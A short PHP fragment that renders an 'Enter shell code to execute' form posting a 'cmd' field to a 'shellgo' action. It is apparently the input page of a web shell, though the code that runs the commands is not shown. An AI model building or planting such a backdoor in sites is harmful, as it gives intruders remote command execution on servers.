<?php
echo '<br><br>#########################<br><br>';
echo 'Enter shell code to execute: ';
echo '<form method="POST" action="?action=shellgo">';
//echo '<input type="text" name="cmd" size="50" value="ls -a">  ';
echo '<textarea name="cmd" cols="50" rows="10"></textarea><br>';
echo '<input type="submit" value="Execute"></form>';
echo "fuxx";
?>